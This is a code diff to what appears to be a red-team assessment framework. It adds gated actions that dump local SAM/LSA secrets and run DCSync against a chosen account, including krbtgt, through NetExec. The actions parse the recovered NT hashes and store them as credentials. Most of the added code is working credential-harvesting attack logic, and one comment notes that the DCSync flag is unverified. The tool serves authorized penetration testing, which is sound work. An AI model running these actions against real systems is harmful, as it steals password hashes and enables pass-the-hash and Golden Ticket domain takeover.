@@ -14,6 +14,7 @@ from __future__ import annotations
 import glob
 import json
 import os
+import re
 import secrets
 import tempfile
 import time
@@ -36,6 +37,7 @@ class Action:
     engine: Optional[Callable[[], Engine]] = None   # read-only actions: a fresh engine per run
     offensive: bool = False              # Phase 3: gated, armed channel only
     handler: Optional[Callable[..., list]] = None   # offensive actions: (target, tgt, *, bus, runner) -> [Finding]
+    warn: Optional[Callable[[str], str]] = None     # target-specific danger line for the arm banner
 
 
 # Read-only enumeration actions. `engine` is a factory so each run gets a fresh instance.
@@ -170,9 +172,9 @@ def arm(action_id: str, target: str, *, now: Optional[float] = None,
 
 
 def _arm_banner(a: Action, target: str) -> str:
-    return (f"OFFENSIVE ACTION: {a.label} against '{target}'. This actively attacks the "
-            f"target - authorized, in-scope engagements only. Confirm by sending header "
-            f"X-Redness-Confirm: {a.id}")
+    warn = (a.warn(target) + " ") if a.warn else "This actively attacks the target. "
+    return (f"OFFENSIVE ACTION: {a.label} against '{target}'. {warn}Authorized, in-scope "
+            f"engagements only. Confirm by sending header X-Redness-Confirm: {a.id}")
 
 
 def _consume_arm(arm_token: str, action_id: str, target: str, confirm: str,
@@ -285,3 +287,136 @@ def execute_armed_action(action_id: str, target: str, tgt: Target, *,
 ACTIONS["kerberoast-user"] = Action(
     "kerberoast-user", "Kerberoast this account", ("user",),
     offensive=True, handler=_kerberoast_user)
+
+
+# --------------------------------------------------------------------------- #
+# secretsdump (local SAM/LSA) + DCSync (one principal via DRSUAPI)              #
+# --------------------------------------------------------------------------- #
+# secretsdump / SAM / NTDS lines share one format: `account:rid:LM:NT:::`.
+_SECRET_LINE = re.compile(
+    r"(?P<acct>[^\s:]+):(?P<rid>\d+):[0-9a-fA-F]{32}:(?P<nt>[0-9a-fA-F]{32}):::")
+_EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"    # NT hash of a blank password - not a credential
+
+
+def parse_secretsdump(raw: str) -> list[tuple[str, str, str]]:
+    """Parse `account:rid:LM:NT:::` lines into (account, rid, nthash); dedupe, drop blanks."""
+    out: list[tuple[str, str, str]] = []
+    seen: set[str] = set()
+    for m in _SECRET_LINE.finditer(raw):
+        acct, nt = m.group("acct"), m.group("nt").lower()
+        if acct in seen or nt == _EMPTY_NT:
+            continue
+        seen.add(acct)
+        out.append((acct, m.group("rid"), nt))
+    return out
+
+
+def _is_privileged(account: str, rid: str) -> bool:
+    # detectable-privileged only: krbtgt (RID 502) + builtin Administrator (RID 500).
+    # Broader Domain Admins membership needs enumeration/BloodHound - out of scope here.
+    return account.split("\\")[-1].lower() == "krbtgt" or rid in ("500", "502")
+
+
+def _default_secretsdump_run(tgt: Target) -> str:
+    """`nxc smb <host> --sam --lsa` (local secrets on one host), reusing NetExecEngine."""
+    eng = NetExecEngine()
+    return eng._invoke(["--sam", "--lsa"], tgt) if eng.is_available() else ""
+
+
+def _default_dcsync_run(target: str, tgt: Target) -> str:
+    """DCSync ONE principal via nxc's DRSUAPI module (`-o USER=<account>`).
+
+    NOTE: the exact nxc module/flag could not be introspected offline - verify against real
+    nxc on a DC and adjust if needed (the parser is format-based, so it is unaffected).
+    """
+    eng = NetExecEngine()
+    return eng._invoke(["-M", "drsuapi", "-o", f"USER={target}"], tgt) if eng.is_available() else ""
+
+
+def _secretsdump_warn(host: str) -> str:
+    return (f"Dumps local SAM account hashes + LSA secrets from {host} (this one host). Requires "
+            f"local admin on the host; may trigger EDR there.")
+
+
+def _dcsync_warn(target: str) -> str:
+    if target.split("\\")[-1].lower() == "krbtgt":
+        return ("Replicates the password hash for krbtgt via DRSUAPI - this enables Golden Ticket "
+                "forgery, full and persistent domain compromise. Extremely loud; will almost "
+                "certainly trigger SOC/EDR detection.")
+    return (f"Replicates the password hash for '{target}' via DRSUAPI (DCSync). Loud; may trigger "
+            f"SOC/EDR detection.")
+
+
+def _secretsdump_target(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
+                        runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
+    creds = parse_secretsdump((runner or _default_secretsdump_run)(tgt))
+    if not creds:
+        return []
+    return [Finding(
+        id="secretsdump-target",
+        title=f"Local secrets dumped from {target}",
+        severity=Severity.CRITICAL,
+        category=Category.SECRET,
+        description=f"Dumped local SAM account hashes and LSA secrets from {target}.",
+        impact="Local account NT hashes enable pass-the-hash; a reused local-admin password moves "
+               "laterally across every host that shares it.",
+        remediation="Rotate local admin passwords (LAPS for unique per-host passwords); restrict "
+                    "local admin rights; monitor for remote SAM/LSA access.",
+        affected=[target],
+        evidence=[Evidence(source="netexec", detail=f"{len(creds)} local hash(es) from {target}")],
+        references=["https://attack.mitre.org/techniques/T1003/002/",
+                    "https://attack.mitre.org/techniques/T1003/004/"],
+        credentialed=True,
+        meta={"offensive": True, "action": "secretsdump-target",
+              "credentials": [{"account": a, "kind": "nthash", "secret": nt, "source": "secretsdump"}
+                              for a, _rid, nt in creds]},
+    )]
+
+
+def _dcsync_user(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
+                 runner: Optional[Callable[[str, Target], str]] = None) -> list[Finding]:
+    raw = (runner or _default_dcsync_run)(target, tgt)
+    hit = next(((a, r, nt) for a, r, nt in parse_secretsdump(raw)
+                if _principal(a) == _principal(target)), None)
+    if hit is None:
+        return []
+    account, rid, nt = hit
+    is_krbtgt = account.split("\\")[-1].lower() == "krbtgt"
+    priv = _is_privileged(account, rid)
+    if is_krbtgt:
+        impact = ("The krbtgt hash enables Golden Ticket forgery - arbitrary Kerberos tickets for "
+                  "any principal, i.e. full and persistent domain compromise until krbtgt is "
+                  "reset twice.")
+    elif priv:
+        impact = ("This is a privileged account; its NT hash enables pass-the-hash to privileged "
+                  "access across the domain.")
+    else:
+        impact = "The NT hash enables pass-the-hash authentication as this account."
+    return [Finding(
+        id="dcsync-user",
+        title=f"DCSync recovered hash for {target}",
+        severity=Severity.CRITICAL if priv else Severity.HIGH,
+        category=Category.SECRET,
+        description=f"Replicated the password hash for '{target}' from the domain controller via "
+                    f"DRSUAPI (DCSync).",
+        impact=impact,
+        remediation="Reset the account password" + (" twice (krbtgt)" if is_krbtgt else "") +
+                    "; restrict directory-replication rights (DS-Replication-Get-Changes*) to "
+                    "domain controllers; monitor for DRSUAPI replication from non-DC hosts.",
+        affected=[target],
+        evidence=[Evidence(source="netexec", detail=f"{target} NT:{nt}")],
+        references=["https://attack.mitre.org/techniques/T1003/006/"],
+        credentialed=True,
+        meta={"offensive": True, "action": "dcsync-user",
+              "credentials": [{"account": target, "kind": "nthash", "secret": nt,
+                               "source": "dcsync"}]},
+    )]
+
+
+ACTIONS["secretsdump-target"] = Action(
+    "secretsdump-target", "Dump local secrets (SAM/LSA)", ("host",),
+    offensive=True, handler=_secretsdump_target, warn=_secretsdump_warn)
+ACTIONS["dcsync-user"] = Action(
+    "dcsync-user", "DCSync this account", ("user",),
+    offensive=True, handler=_dcsync_user, warn=_dcsync_warn)
+# Deferred: a domain-wide `dcsync` (all accounts via -just-dc / full --ntds) - out of scope now.
